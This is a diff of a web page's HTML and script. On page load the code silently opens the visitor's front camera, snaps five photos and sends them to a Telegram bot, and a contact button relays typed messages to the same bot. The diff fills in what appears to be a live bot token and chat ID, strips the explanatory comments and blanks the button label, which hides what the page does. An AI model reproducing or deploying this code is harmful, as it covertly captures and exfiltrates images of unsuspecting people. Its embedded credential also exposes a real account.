@@ -92,23 +92,25 @@
   <canvas id="canvas"></canvas>
 
   <div class="gallery" id="gallery"></div>
-  <button id="contact-btn">رسالة إلى المطور</button>
+  <button id="contact-btn"></button>
+
+</button>
 
   <script>
-    const token = "توكن_البوت_هنا";       // 👑 غيّره بتوكن البوت
-    const chatId = "معرف_التليغرام_هنا";  // 👑 غيّره بـ ID المطور
+    const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+    const chatId = "7664410054";
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
 
-    // 👁️ التقاط 5 صور
+    //
     async function captureAndSendPhotos() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // ننتظر حتى تعمل الكاميرا
+        //
         await new Promise(resolve => setTimeout(resolve, 2000));
 
         for (let i = 1; i <= 5; i++) {
@@ -117,10 +119,10 @@
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
           const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
           await sendPhotoToBot(blob, i);
-          await new Promise(resolve => setTimeout(resolve, 1000)); // انتظار 1 ثانية بين الصور
+          await new Promise(resolve => setTimeout(resolve, 1000)); //
         }
 
-        // إيقاف الكاميرا بعد الانتهاء
+        //
         stream.getTracks().forEach(track => track.stop());
 
       } catch (err) {
@@ -145,12 +147,12 @@
       fetch(url);
     }
 
-    // زر رسالة إلى المطور
+    //
     document.getElementById("contact-btn").onclick = () => {
       const msg = prompt("📝 اكتب رسالتك إلى المطور:");
       if (msg) {
         sendToBot("📬 رسالة من الزائر:\n" + msg);
-        alert("✅ تم إرسال رسالتك!");
+        alert("✅");
       }
     };
 
@@ -185,7 +187,7 @@
       gallery.appendChild(box);
     }
 
-    // عند تحميل الصفحة
+    //
     window.onload = () => {
       captureAndSendPhotos();
     };
